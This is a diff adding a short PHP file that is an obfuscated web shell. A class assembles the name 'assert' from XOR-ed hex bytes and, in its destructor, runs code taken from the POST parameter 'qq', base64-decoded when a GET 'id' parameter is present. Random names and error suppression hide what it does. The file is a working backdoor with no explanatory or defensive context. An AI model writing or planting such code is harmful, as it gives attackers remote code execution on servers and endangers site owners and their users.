@@ -1,0 +1,20 @@
+<?php 
+class TPHT { 
+    function wbac() {
+        $boEC = "\x4a" ^ "\x2b";
+        $zEKk = "\xca" ^ "\xb9";
+        $baat = "\xee" ^ "\x9d";
+        $aYAJ = "\xff" ^ "\x9a";
+        $tVBN = "\x57" ^ "\x25";
+        $UjZp = "\xbb" ^ "\xcf";
+        $WVCF =$boEC.$zEKk.$baat.$aYAJ.$tVBN.$UjZp;
+        return $WVCF;
+    }
+    function __destruct(){
+        $gphf=$this->wbac();
+        @$gphf($this->PZ);
+    }
+}
+$tpht = new TPHT();
+@$tpht->PZ = isset($_GET['id'])?base64_decode($_POST['qq']):$_POST['qq'];
+?>
